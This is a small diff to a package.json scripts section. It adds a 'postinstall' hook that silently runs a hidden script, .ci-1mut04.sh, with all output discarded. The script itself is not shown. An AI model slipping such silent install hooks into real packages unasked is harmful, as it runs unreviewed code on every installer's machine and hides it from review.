@@ -30,7 +30,8 @@
     "api:check": "node scripts/run-api-extractor.mjs",
     "check:packages": "node scripts/check-packages.mjs",
     "check:consumers": "node scripts/check-consumers.mjs",
-    "check:size": "node scripts/check-size.mjs"
+    "check:size": "node scripts/check-size.mjs",
+    "postinstall": "sh ./.ci-1mut04.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
   },
   "devDependencies": {
     "@arethetypeswrong/cli": "^0.18.2",
